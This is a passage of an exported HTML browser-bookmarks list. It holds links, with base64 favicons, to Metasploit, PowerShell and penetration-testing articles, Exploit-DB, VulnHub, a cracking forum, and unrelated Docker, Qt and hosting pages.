icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABV0lEQVQ4jWPkantxhIWJ2ZqBDPDn39+jTMianSVZSDKAhYnZmgnGUedlYlgXJ8AQIM9KmiEwRrQOO8O/f/8ZFoTzwSUZGRkZJLrfMLwoFcHQyN/5Bs0AI06GvA2fGdbe+8XwvEQEroAT6kaxbgifjYmB4UkxwkC4AV6LPjC8+P6P4fc/CJ+VkYHh93+EjT//EfDCzc+oKpA1I4N/aOJwA04lCDCoiyNi4WM5xJkSUKczMUI0/8XlArMFH1A0o4cBLoAhXaDPzsDAwMCQq8uOIs6MwwsYBjR68DKsu/idocWLlyFZkx1dGr8LAhVYGf7++8+QuOMrQ+DCDwx9frxwud//IV6DhQ0MoKTdBeH8DAtOfWdgYGBg2PfiD0P6mk8M3/8xMAh2vUEJF2TAyNfx+j8DAwPDKj9ehnVXfzKsuPsLu1MZMf2PYgC5gOnPv79HydX859/fowD6kXNStdV4NAAAAABJRU5ErkJggg==" target="_blank" rel="noopener">如何解决Linux内核头文件和内核版本不同的问题？ - 知乎</a><br>            <dt><a href="https://www.corelan.be/index.php/security/metasploit/" add_date="1492327757" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACm0lEQVQ4jY2TW0jTYRjGn+//38G5/9Spqa0MbFNhKyOxWnnTTeSFSOsuCgoiNCIKSdASRBPMCCE7EV0JBRLetEzBPCAoap7w0HIeyszN1jYz3Ybu9HaRE6tpvTcfvDy/B973fT4eW1R2drzi6vlA/tFMqDt7yQwguJU2TOkkj6vl162josWJTjZXfoM3AGD/hWo0Gun9CqFgtl/koCUQOUADzWymOF+UA4D7B35cVFOuuGjuFn0lB4jmQWQBkQ3UbWSmCwac2I7maytx5tM7WGlxHQ4ZWH+ZtL1kY2fzkP0btP5y1aXCKX1W0t3YHarkKNkqEOEFJBK4V9WQyCIB3oWUZJYQH8vt93poZGwSlpABV1YYlZN30luj0ybtHTYp0dqtxEEt4U1rJsbNaZj6nAq7PR2M24P01OVdgtytXbBgcNYCG4quKHNHOqQfyMmIHCByRNNpwwESFDsJEBMAAjjSadOo7skxImcckQ3U9IK16DNwhIPfGxvw+QXwBHgZEOOBIHPBteIE4FufMIj3phk8rfPA55EAEkAeCWViAmJETV3uekHgGcexO7p96iRTnxS7VXHobyc0vlXANJUClzuIdI0C+eeCEMvn0dXBzEYjf/NVq789tExxVTEK2hrU3yZ69PTjYyLRGohWlOSx6Gl14RCRXUXkiKa+Rn6q6BJy/wqWTgfJvVJcm+7Fd1r+44QLIFoEDbXgy60C3rA5UKEzwm5HYHIOI9GRXFApICtehYiNFYiBwQFmbWzmSyoeBhqw6V9sGADA0hL8kNIw5+NYQhwOK1WQgAfGx5j9tZErKasN1APwb5dGAEBGIuQPKrkqyyjzTPcwx+1C7jIAUTgtH65pc8MnSGnU6eRkQ+PU8ug5PXO7sRZO+xPebi2MwfPKlgAAAABJRU5ErkJggg==" target="_blank" rel="noopener">Metasploit | Corelan团队</a><br>            <dt><a href="http://blog.csdn.net/u010472499/article/details/52994454" add_date="1491159510" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAABWklEQVQ4jbVSwUoCURQ9V2fGmUwxagLNwAiDQaHc+AFu/Qt3FtRnuLf+oMCN4GL20c6FEhiU4UKDIFHLJipwGvW2GBUHqXDRhQvvXs55953zLlVBWCZcS6EBCM6S7SRADIWk8DYpCg+tUb9vtlo8MBcJUBKJzWzWn06LweB8f/Rm1NbW5wnsUpRwPr+RyYAWVbH11HY8iQRhV9d9qZRdGqVSv1AY3NXHH+8kK+JWyO3zOwjq4dEM/Xhy3D09ozn3zEZjdibbVu2mpsTjAMxm8zYaZWb6we6JrbKmzS5j5l++ZkIYGwYAEGRNI0HgPwmvxSIAAnkikZ2LcykcZjDADADskj0MdmhwBwJ7V5cr+wcAmBnMX60H67lHgiCqqtXp3CeTsFVVQVVQBbj2rrZzOav/Ml4IQ9crUyRNl286UZK8yaQciwmqSm73eGAOe93PcnlQr9sT6N+39RsgVo7oiKSelAAAAABJRU5ErkJggg==" target="_blank" rel="noopener">Docker 资源限制之内存 - 小丢丢的专栏 - 博客频道 - CSDN.NET</a><br>            <dt><a href="http://awhitehatter.me/interactive-powershell-in-metasploit/" add_date="1492702343" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAOklEQVQ4jWNgGPKAEZmjoGPggE3RgysXDiDLw/gMDAwMTLR0HX0AUWGADkZSGKDHP7o4A8OwCAOKAQB38RQKMfDyNwAAAABJRU5ErkJggg==" target="_blank" rel="noopener">Powershell在Metasploit</a><br>            <dt><a href="http://obscuresecurity.blogspot.com/2013/03/powersploit-metasploit-shells.html" add_date="1492703799" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAz0lEQVQ4jd2QPUpDYRREz/meUUE0IpGgiI3yCDaCCHbZgEtwBy7NJVjY29gJdkYrRUmigoU/mVQPbKzSiMMwzAwXLgz8OVRCacJvfrYPPahhAYbQwxqW8Bl2oYY2jmHSXLeg2oKTUi6SPm7oLXmDQ9zTGzjQY0u/eJ2cltIJc3dwFh5gXT5JS01WZFnnoQtjGYSOPoV7KEfaJsC25SoZJiPYwfPJZJBUuBo+oEbJC3ENvuAV9nUz+YZLXCSPAHRR8g4FWjCaaS8b0ig/mn+FKd0rPQ2phOlZAAAAAElFTkSuQmCC" target="_blank" rel="noopener">obscuresec: PowerSploit + Metasploit = Shells</a><br>            <dt><a href="http://stackoverflow.com/questions/30250442/problems-installing-metasploit-framework-on-ubuntu" add_date="1494509691" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABXklEQVQ4jbWQsUsCYRjGn/fuSu/Sk3ALmlzNtoagKRqSaHMKGkKhEOV0KWispSXPQaglAnNobOgfaCyIcgicmxO9zFPv/N5WwTs5gt7x+5739/2eDwgw/bK67HcnBQG4Ag3L0LJ/BoBFDuDzTiGUCAywDC3bNbRtANCrwxaBziRZanAGcjADwR8AX1uGesEZyFGzXwO43VsKn07GaJa5lY/GMefUAYooEvaELDnCEW9M2I1V7GdPg04hlLAM7dYqqut67ftLNwdpMB5dgRfXdVMgHIFpx9egfbwYk0eDA2LKAWJMkK6cUOhOGdkpZmoQiy29OmwFq1AKb5CgQyakAXqQJKpELn/eJzPK1JKhPhHjk4EmMzUVmU/coVLkeXff672pk155YXUsxikCJQFeYVCSgCiAV920N311b+r37FslH413S+qaV86rggfIBbG38RRAN+2ZHzsTMKvGv80vvziHGAusG84AAAAASUVORK5CYII=" target="_blank" rel="noopener">ruby - Problems Installing Metasploit Framework on Ubuntu - Stack Overflow</a><br>            <dt><a href="https://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit#Editing_an_exploit_module" add_date="1494512362" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAADC0lEQVQ4jWWSa2yTVRzGf+95315ou0u7tXSYprJ2y1Kn2YVsCyGDcImJyxi3gYpoI/VGUBkfCAkfMCQkJJgIxHDRGcw0CFYi4WIkmhqoi4gBQ5cxjFLNIG6us5ANga193+OHpnWW58v58PzP7zzPOQf+k+JpWLHN3bQ8CPB4+Kg19HLf63kz8uHA7JcOJdZTJCW/eptWHdANfTOw+7GGFe9OCXFOKLSpiupvamzMaiYZlwbOCZcyJ7r2iek8QNDdrXqbVx512LRIuKsekyZeywhx3l85KzgvUCoqys3vaJq83Oy3+6qcZsM+rq+ZmUBUJbOflDks647t6bBuWtuAEKLMraUDfT0hz7PtXu7dzzzfEnB4XllcZVne7HJpqrL1f4ASu/mZ43s6rP6qUmxWjc72gOozpypsFpX5dWXYLWJW0GVYFAUa/XZVU0X1hsMD8wqA6N5OfY7HUSCuXlojYpdukL77D6pQ6Gp188XF33LDisKy+nJDGLxZAHgr7eMzIz1ZU0m1r5xT3/4MQFerm/7ro4yk7wOwtN5ZIYSyemPvoCt3iXCz+GlWLQ5y4qsfAfCUmWmtdXKqPwmAwyqomW1JZzPGujxgoBjQuSjI8Mgdrv1yK5eipYKT8SS6IQF4+imXVxNsBBASGS8GlNhMLGvzEz2XS7Eg5ERi0D84kqvps5k0RdSEjyTqhEUo3wP6IzWW1HI6lmAqk0EV0NniJnoxV0MVCm21JVmpKy8K59yVd4ELxYDbf01QXmpFQQBQ7bFyY/hOwW8LlrrMmlifc5HRmZu/+2mY9z69wuFdGzCbVP6ezHDw6z95tSMEwMQDnc8vpYandWNMABhG9iQwDXDhym2274/LgzufIxT0cSv1kMj7Q8YLS2rpbg/ww6+TcvuJ3yeTYw/6LGJqYeHUseSXx2Pf9Mq589fIyJatu+6lh87fTF6Ti7Z8lt3RG/tAzz6UZ6+O6ps+uj4aPpKoK67M1csft3eF3/gj8nbPIYBUKrFw877T42/tP7NNSqnEB8diPX1D/fkPlNe/P9AFgfh3swAAAAAASUVORK5CYII=" target="_blank" rel="noopener">Metasploit/WritingWindowsExploit - Wikibooks, open books for an open world</a><br>            <dt><a href="http://bobao.360.cn/learning/detail/3041.html" add_date="1496084765" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAC6UlEQVQ4jS3QTW9UVRzH8e/vnHPvnek4wQrSAC5UalAMxidWSnwFECVGYrogvggfNrpgpbhyZdgYVyRWE5sYTbozFjVGq0ZUbAaMqFQqiZ3aKcO95+Hvxs9L+AjghaWzp+ph76XUxsOCRnJ0JRFzFEDlK6tdwKxg0Ia6+jnebN9458SLizr98VvPhdqfF/gcsxlGm6L2D2a59/Y5AH4db7C+s0kTKhPCV14GucS0EMzcawXvcxeT4bxZ0fMPPGXH5x8lFxOAd84+urLK4i9fSnKWu5J8VYWMvRqy3MHUFXOq/M3ulk4/+KQdn39cH46+ZuXaGgDHDhzSM/cdBZy9++OKZuqeT7EYuPkQCY3MNC3F9g/32on5x7Q0WuXcxQvcVjUAnLt4ARBPzz+i5d/XbH1ni1peQOOSebIFbiU0NzOrvyZjPvltDakhWSBZQGpYvjoi5cTdwzs1jaZigUiwkMyDGd43dmn8j9789jOq0Ps/UADkUpht+mxM/qUrkFRZNKeCCMmcnGCrbXXy4P0sHHqYYoUgh3eObEaxgpPDS1S+oStSCp5iKCRzYBBczZHd+6i9Bzxdzkxjx7BuAMc0RbIE8iRzJPMUM0KHt1SKdjUDe2jPnJavjvjm73XmZgYMQs2N6Q6S8HIc2b0XuYpbeOuZUwFzEc8kwT3DO+QkJikx7jrGbUcv1CQzdmJiT3/AnzsTokEsUmeezjw6uvRBKaVoUFW2b2bA208c02zTI+ZMskI/VGCwHTsq53j9h+/svSsjdlW1ikFIWS0KzWaX2Wy3tHJ9w+4aDNR3jrlej1KMyjv6wROct5hNybwlgmVK51r85Rh6MkI2V9srq99z6tMV+2rjug2DbBBE7UVwAAjnrTWfU9VTZ34UuqIzMp2n6gWL0YTJcHyxuc0fly7T5gwABk7i8xtjfG8QpoVUis4I4MDi0rO+mXnZYncYaASaxEQsJgkwDIGZMQihbfr9n9L29tlrCyff/w8p1YqGuQvfowAAAABJRU5ErkJggg==" target="_blank" rel="noopener">【技术分享】Ngrok内网穿透的几种利用 - 安全客 - 有思想的安全新媒体</a><br>            <dt><a href="https://kaizensecurity.wordpress.com/2016/08/19/metasploit-av-evasion-with-powershell/" add_date="1492704884" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACx0lEQVQ4jaWTT0wTURDGv30ta/m7wBIIQbGIYNIiSELAgAcvclJJ6gUiMZwkHsST8Wg84wUSU70RKOvBhIRwEQkJMdioAUTEBrb8McViarpJd0tpu9vueMCt1atzesl7v5lvvnnDgYhDfrzcccE0h0HUw9tYKwDoWXMDHPcOjL3AwPlA/nP2Fzwtj/Gg9X5nidvf66Sox5mMepxJf6+T+p0lbh60jml5LB/hcgp82yuucp6bvVpX/+ZHUpzc1/BJSWUAoF102O80lKG3tlDpWwqHAjGdMHih40+CaXnMJRRcmb1aVz/oj4gW+G8MNQr2p20V8csL33cCqrGM280POEhBNw9a/3rjrDoaiIkAMLGrZoYaBXs+PLGrZpIDTXYASKSNeNXMt0Id3CUG0xz21Be/PVfCi97OanjOlOQgb2c1vJ3V+BxLAwAWfhzn7jz1xW9hmsMMRD0jTaJw7+NP/FvRAtrKTwEAHn9RAABToePSkSZRAFEP422stUVgzRO7ambvSFeu1RblkswcHJ1U+63K8mZyX0OLwJp5G2v9a4yWB1b/bRUnla2k7aLDvnekK/kmMz1rbmyqptwuOuwTu2oGAB66yhUA6K0tVKw2hhoF+5OLIkYDMbFddNg3VVPWs+aGDbfutyTMbNnN06UN84cJs6uqkHWIjqJwMssSGSpaiiRxva4YLqFAqTzFknffR/hH7kr26kDd2lSNVUAKunlJNoLxdLRrPkR3P0QoS0RaSte65kPES7KRJaIsEb0+TFDXfIiC8XSUl2QDUtDNMHA+oJvk7VsKh3zdNYo1snzTngfVnKm+7hqlbykc0k3ynuwF0clvnNpadc3trQXj6aiW0rVncox4STZ4STYsVcF4Ouqa21vD1NZqjssdiDj4tsd5STb6l8OL/khqRUvpmpbSNX8ktdK/HF7kJdmAb3s8n+H+d51/AXgclBDq8lg2AAAAAElFTkSuQmCC" target="_blank" rel="noopener">Metasploit AV Evasion With Powershell – KaiZenSecurity</a><br>            <dt><a href="https://team.nuptzj.cn/" add_date="1502963185" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAC+klEQVQ4jV2TzWtcZRjFz/O87525M3emGTMZjPlo/Wr9WAQKRegshKoogqI78Q9oxWgXQgruLLgSq4K0JM1SBHduulGwZhMt9QNEulAsRDvaNJN00s7MnTtz733f46JRpj3rH4ez+B3BeEiBCAHg44ut2TAqzxuSg4zX3nm6sXkvAwCCe7J8ufNSENgTaRI3VU0EAN7l/UKpvJ6N3MqbzfrX47z+13ri/Plg9cfOcqEQXKD3L4Os51ka5lkaAjIF4NWgaL9auXzzIwDA6dO6t4ACCJcvba2WK7Xj/d3tjIBARHVvoQcI0qmqaFix6z/8fObzxWOnAIgCwrPf3XilGEbHe7e204wwImIUkNwTufcQQEgGmaMm3U7miKXn3//yGQBUAGKtOenyjAroU/urQhJJ5vHgZEEerocyzDxEhEfmIykVAxx+4iAPP3nwbQDQT9Y2DvjcHenFA8zXiuaRqRCNKADp5VCjzEONMgEv9SjAo1MlzE0UTaUUohaFzZnXz0zZKKocyHOG0xFkYbbCehRgYTbC/H1FPrCvKEaB5kM17gsN6lGAhZlIhq1YNrfz6uOPze23CkuRDJknrmzGMCL4vZ0gTh2KVhEYwcbNBGFgMBFaXNmMkeYeKkDuLPVWL/lLvE+2B46ZI5LMIUk9WrtDAUB68u/bIxmkDknmkHmyMxSWgqB79eqfLV16duaaGPtTtRJhkDq32U2ROqJUsNzqp3Kjl0polbkjrndTJKl3/eEIu/3k++tfLO1YAMyZf1qyxed2erFvx7kagVgV/NEeEgCsUXRHufzyT+xdnuPX3zZka6d9ds9EyltHpy+MhsPl2mSjYAVeAEeA1iqtVRKgimSBUR9NTAZW8MHF915b+18kkPJta+1kMojPhVHVhuWKVVWl90rvVVU1LFeDICxb5tmHny0eexek4I7Gd2f1UudFseaNdDRoqjEVkPD03WJYWk/T0cri0fu/GefvLhi76rm1jWlTrsx5gvFt1zr1wnT7DkKRsTv/CzkAe6RCKMbZAAAAAElFTkSuQmCC" target="_blank" rel="noopener">主页 | NJUPT 安全团队平台</a><br>            <dt><a href="https://www.vulnhub.com/" add_date="1502714390" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAC9UlEQVQ4jXWSb2iVBRjFz3ne995buxtqjqCWKTMKdrl7hSA3SfJTZPqhqAV2N9ggl0TSh/5Bma1lBQUhLKT6Ulvv3VZ9WNTAaQWtv2Shdk20dDmsbYW4Rbo/7t77nL40WWbPx8M5P3gOh/ifa2lpWSvpBUly9119fX3Dl/MFlxObm5vb3H07yU/NbARASxRFtYVC4fNLvbxUyOVyL5GsBTBmZkslsVQq/RkEQaW7LwvD8JGenp6x/wCampqWJJPJPQCm3T0ws3EzGwMAd19OMgPglLs3mFlXHMcfXHwhl8tlgyB4XdIoyeUkD5hZDYAbAKyQVEnyYwDrAPwA4PYoitYUCoVPmMvlNkp6zMwOSqoBsA/A3SS/iuP4FQC49Z4Ht1yTmm69Ah472SCpSPIqd18R1NfXf0FyLwCRLEjaQnJPPp9/GwBmOq9ubK87OH1mpuK7k7NLt4bGQyRPA1hjZqeN5G4AtwE4C2AlgK35fH4QHR22bdfTNanybBt82fBD1x3+6/3e+E6SCUmbJZ0BQJO0HkAPyRsBVPX29p5aKPZIaeU7UbL7RHHq/MMq2/Mvt9/RNFe2RklvkRyWNBJEUbTKzPZLOkdySSaT2RFF0U9Hurp+rd2waUNlKmzrDO7/dvLk+OjRmer7QmDAjFUAjkp6IMhmszslXQ9gJAzDIUkJktuy2Wz1Rxtf3FmaOra74fjQk2NTob1RN3wgkx4/MTS5ujqh+SfMrJP/LO9VAKsBvAkgTfIXd9+RMJ53L9tcmJo8nLn33eNzzR0DZ2/6uvuPuroKzD7a398/GgBAoVDYl81mL5B8luSXkq6VtBdm0+H83O8Tq26Zd9hd7f6hznn6m8d/XvfMj4OvTQKALRSWz+cHAGyW1ApgfSqVOubujWXD2sDnq0RdQJnJm9MTo/iso7SQuwgAgDiOJ+I43gTgt2KxOBCG4WBQ8vfoXkV5hQesmPHElYsz/wIsAj3n7k9J2l4KwlYJh9IsdQdUf5Dy7xd7/wYaBVr0gO7NnAAAAABJRU5ErkJggg==" target="_blank" rel="noopener">易受伤害的设计〜VulnHub</a><br>            <dt><a href="http://www.xiangyunvps.com/user/logininfo.asp" add_date="1506335419" target="_blank" rel="noopener">香港免备案云主机,国内免备案VPS,国内免备案空间,香港空间,cdn加速,国内服务器租用托管,尽在世纪互联</a><br>            <dt><a href="https://www.52pojie.cn/thread-211740-1-1.html" add_date="1506352881" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAC1klEQVQ4jQXBy0tUURwA4HN+59yH470zcxkFx8eoJCPooKLLwhqqRbUIJAgiV4HQwm3QTvoXahGuRHGnOC5cyFj0AKUgMgysyMcMMzh10e6VuXNf59H34cuVldbqKsnlhG1LzsE02ekp6Drp6eHn57xeJ4ODGAAsi9dqxtwcma/Xo709GUUoiqL9fePxY0xpsL0dffqk377dduMGGAYiBEzTW16GdJo8v3eP12rWq1ciiqwXL6QQpKtLeh47ORGO0z4zQ4eGhJTB2hr/+1fJ5yE+PVXGxmQUxd++hXt70nHYr1/B27dgGCSfh2zWf/eOWlbb3bs4mRS2TZ5NTupXrwrP08bH6ciIt76uTkwI28aU6rduyYsLms2CacowlK6LNQ2wEM3FRazrSFXDclkdHaX9/fHv3+H377xaRQDBzk5QLmNF8T9+pAMDAP398dFRUCr5pRLJ5TBA9PmzOjwMigKWJVstVq/jTAYyGQAQ5+e4cf9+sL0tgoCYJh0YCA8OEEK0owMxJnxfLxZJV5e4uAjev5eel3jwACCVEkFgPnmiTk2xajX59Knx6JH0fSQlzeV4rcaOjyGd1qanBWM4nabxwYF+/Xr77KxoNKKTE21ykh0fY1VtLi21zcwkHj7kjQZJpaL9fX9rS3oekN5e2t0dfPiALQu5bvP1a27bvFIBw6BXrmBKsao2NzeVqanEnTvx169Au7ul57UVi/zsTJ2Y0ItF6Tjh7i7WNDI4yP79E64LmobiOD48VEZHQbguVlWSzUrXlYxBJqPfvEnyedFs+hsbeqEAiYR+7Ro7OoorFYQxxD9/Qk+P8H3a1yfDUDgOAkCMIQBlePjy5UucTCKEkK4jjIXjUCRlUC5HX75gIUSzKTlHnMc/fkAqxet1Vq0ihITjIIwlY9DZiVtv3jgLC0o+L2xbtlrQ2yuDQPz5Q/v6WKWCLUucneFkUikUUBwn5+f/A3gvfAEHLK4lAAAAAElFTkSuQmCC" target="_blank" rel="noopener">[新手必备]汇编命令及OD常用命令及断点设置 - 『脱壳破解区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|破解软件|www.52pojie.cn</a><br>            <dt><a href="https://www.notsosecure.com/blog/" add_date="1506391946" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABaUlEQVQ4jcWRSyiEcRTFz/9+M4WFhaHI+7Gh0CjjVRYas1AWrMlMGeyVrKRYSBZT49VkpVFWXo3V5LEij1IWs1IUigUNYfiMOVYjor5v5yxP9/zuPV3gv6VIbrze3VUk9HfjaRGkZGUGNU0bTVoWAKH96fn2Pf+c8TYR9GyuDpEMKqXOAEAABO3u7lvNajUEMJHA1shYKsnJr6OUUi/p+XmB8vY24woALo+OEVlZ6yDZkrwAIjJb298bM0UAsDM2Af3xaYqkRQBAKXWTba9eLqh3mAI8XF3jMLBgB+CWry4iPseA1xSgsKEOhU2NbwCKLElTKXUa1/VwRnFR6/35xZ/BnKpKNA8PfpQ4W5ZFZFQpdSbfBzSr1Vfr9fwK2spK0RGYgSccWi9zOWs0TetKvvGHSEosGo1MlVRw3JZLf7WDJ4tLjOv6NslGU/1I9u35/DyYDVB/fj4k6TIV/AZII7lLspOkGCf+W596cIt4olUO7gAAAABJRU5ErkJggg==" target="_blank" rel="noopener">Blog - NotSoSecure</a><br>            <dt><a href="https://www.exploit-db.com/papers/17934/" add_date="1506406293" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAADKElEQVQ4jW2TS2icZRSG3+/7/3/GuWVqYg10McEaFRtI2kQhWqwdtHZRBLsYokKmRdNACl5ag1BXo0XEhS6kWERUMGplFMSFCF04FXXRpiitNslYJ2kmnVwmyVySmfnnv32vC1ON2md3OLwHDuc8AhvkHkWUreiFRIfPMH6Ljdk/A0JhEyQ1IYSHm0FAAMD88Lbg7ABeyD6GE9df2R1ftdhFmnekUil50+Bmise2dg4DxvQHx3tqP52ZNRdytGzbJGlRqQt03UP/zQgCYiIBY0vYf1JYznOqdfvktneuhlZt3FWu19UP3/+oBUNh7tu7W7b5ACj1ltC0UZJCCEFdAJwO+IcjmvvyvKm8e46+2zuZX8Dbp9/3urq7ZaVcodR0BCIht79vJ9p98iW67jiESGcyKV0CEFKgw1z33NCOfs/qjHsfnUl7joL89dJl5HI54Tc0UV1ZlrPXCwQAaNqIABGPp1wdAA1Ni0oFPdR5n5UvluRKqYyAPwAAUjd8LBTmYdVrotm0tepKkXt77t01l9p/sHkeUzI3aLzoBLd+1bDxS8st0u8oKJAgAKVICKDetFCpNXBlKstiaR2GZFBRBkUd67qAKBjm8ohDfGqXV81Ye/TBUDjiNW1b6poOpRR0KWE2LZSqVd7eEhR1BP7oeDXzGSCU3D5mf+HRec3Xqj+0fP6bC+HyteIT++Osrq17juP8fa5ao8G2lhbv/l09Sh//JA8IlSKlJCBjHzoXH3/ASThTlcnGpe+8R/r79OeTCT0ajbik5wkqdt8ZkydHj/rDM+fk0qmhfflB7TSE2BifpgYA2TUeL1ls5iocMR1maNc5v7jExZVVVbZYVdPjZ2cGQzOVw4KFpPz8LweS/ru/BiJNj8dIsvTl66eyezCQHfC9Ufl49ARdO1l775nfF948eAgALh/ArYtHfE9mn8JtAICridYda+fGvlUk6xOZZyf2IJkfahtZGgq139j/Shd2Fp7G2ZkjWx7+3/9fq7PX9rhMugc2tNI22SdJagDlxeG+4PThQCKXQJQJaDfkA+fmAjTNGAAwndYISKbwL/OIf+p0Atrm3p9T0qAQNXXi6AAAAABJRU5ErkJggg==" target="_blank" rel="noopener">Vulnerability analysis, Security Papers, Exploit Tutorials - Part 17934</a><br>            <dt><a href="http://www.yalewoo.com/qt_tutorials_2_gui_introduction.html" add_date="1507261859" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAADWUlEQVQ4jV3TS2xUZRjG8ee7nHNmhs6ZCzNlptjCACMzpVIRLzF4CWITSUhcGEl0wULj0o1ujWtJTNwYF4jgRkMa1MRodOElqRHaYkEqU6hTQu/tdOrcmJlz/14X2C581v/8dg/D//YrkVwuVffeV+KIG/jpWw1P35cw+N5YaGooEUw/Eos1GGO01UsAICIJgD7/c73/3A+LZ+Zazms2sdxjvbp+MKnhp/W2clbbzULMGD+SprNENMkYs7cBAOzjqUrx+0X7w5m6dcJhTEjJMbbpIhPX8e6huPh0rpO8c989ueYERV/R+0R0iTHmMwC4WNrIfDnTOj/TcE/6nHEuGaQuoBsM/T0SHwzHkJLAvA3canrQBVuwwN585+Gdv4kSkf7Vzc23r204bzgKkgSDpnH0hAX6ejQcikmMVMeRHjuHgRBDIV/A1yvd+FpH7c9G5I/y7mxl92y1+7rtk2aGBB7NhPH87ggOxHXEDQaTbCQufQP19wRotYzQwGGkQlH8UfOO/rxmPSknS0v711u8//FMHK/kTeiS4XbLw0TdARhD1ghwxhxAn5gCJwVBPp5IhlBq+KFq13lJdiznwOFoKDKcCeGL2RbKHR+eYNANjnRYohXh+LZwGq9mc0il+3CFUphuOjia1LDapbzsjWi4t9nF+b/q6BIHSQ7JGFQAdAOFlsdwQ5gYGnwZ+aiOy7MNLHcViICDpnSlE6iNydtLnveQYYieKIgIpOgB4BLqLIAChxUw1FyFpY5CzVFoOgph8GXe2xMpRZmqWCuLgOeBKYLyFQI/gOc9CDctBQ5gruViuePhH8sHBUpldHGdFwvmQrE/8UvQqFFnZQFwfSD4D3EVfIfguwRTclyp2GhaBMdVyGp85UQ2MsGP53L24C7zoz07w7N2ZRXt+TkoywL5hMAneJ5CQgCOp3BtzYHvKIQV7OGk9klyn3lDAMDY5QvV6fnaYq1tPV2r1WNus8kYAUJIEOM4lgljue1ifM1CBMp6Kq1fGNljnj2VjFhs61Wjo6Piqp16Zry8+d58rf1s3fIMaAZS6QRGirvw+1I72KHLu8dyyc9OD6UvPpfPVgFgG9iGrpfTN8vVF+cqzRdaHTcfDQk3Hd3RNTR+tdCf+u6t44N3GGPBVv8v5XGrS+NCijYAAAAASUVORK5CYII=" target="_blank" rel="noopener">Qt快速上手2——创建GUI程序 | 雅乐网</a><br>            <dt><a href="https://greasyfork.org/zh-CN/" add_date="1507339743" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABXElEQVQ4jZWTParCQBSFz+CgFoYkGCJoITKVexBclOAC3IKFnWV24A5cgK0QUEwsVEQ0YmEx5xUvb1Dyo+/CbYaZb849914gGwrADMAawDPNdXqmcu6/xXwwGLBerxNAUc5zXwohVgDY7/cZRRGllGWQVeZnAAzDkLVajUqpbyBGiRoOh+x2u2y1WtxsNgay2+0+QRQAzFzX5fF4ZLvdpu/73G63rFQqnEwm3O/3rFarRYAZUodpWZaBNJtNxnHMv1gsFkWAtQTQA4AkSaCUQhiGmE6n6HQ6xqDT6VTUtR7w22dDtSyL1+uVWmuj4HA4sNFo5Cl4mhJe07ZtLpdLBkHA8/lMrTUvlwtd182UgNSIQqcdx+H9fqfWmrfbjY7jUAjxZqIqAwCg53l8PB4G8lKOGe15GUAIQc/zmCQJSXI0GuWO9OqTEtu2OR6PKaXMjPJXSlC2TC/xr3X+AblgI7SP3jS+AAAAAElFTkSuQmCC" target="_blank" rel="noopener"></a><br>            <dt><a href="https://www.waitsun.com/" add_date="1507536946" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAByklEQVQ4jW2SPU9UQRSG3/fM3V2ELLsGCj+AmPADCDUtv8EYtrJWojbGWGuiBb1r5Q8wNtQae+NSKFD4Ua0UJAqRCFzvzHktZu+NiZ5i5sycjznnOUOXCACQBIDkvzoBMHuhyEZJkhOEGQSXAzAzAO4uKFjIAZS7A1YncHeasdabMAGQAFguaX+0c+fG9eHjRyAPx+MHg42ntzdTVVWxerJ56+Fg4/DgYFJqVVWS3m5vLwE319Ykfd7dXQHW5+dOz36dn56vz82vAF/39yTFGI2kpKLVvhjCTLcrKYQwG0K31zcaDL1+vxcCzSSRtExDUEpJ7iQBeUpKCSCA5DGlBDFDs7p3sqEpCiBJSsz9NlRRTHY2C5RdAOUs9ZSyFGjOgIAUo9zza54iyGAEULTbJEkWmS+NFkJnaioUxXRvFiEUrfaF6RkAP38cLa+uXlpYcHeShSRSVVmepPTl44dXw+fvXr/5nlLr2/jlcPhpNFKnc3/4rGi1UowMgSkl0vZG719sbQXorPp9bXHp+Oi4KsuTsrx65fLg7r3F5eUYYwiBJN0FiA2F/0mM0SyAIMD8YST5ZAhQppOZSTRr0pGg5I1Nk1vWav3F/5I/0wwL1ik5SyUAAAAASUVORK5CYII=" target="_blank" rel="noopener">爱情守望者_致力于分享最精彩的互联网</a><br>            <dt><a href="http://www.sdifen.com/" add_date="1507536950" 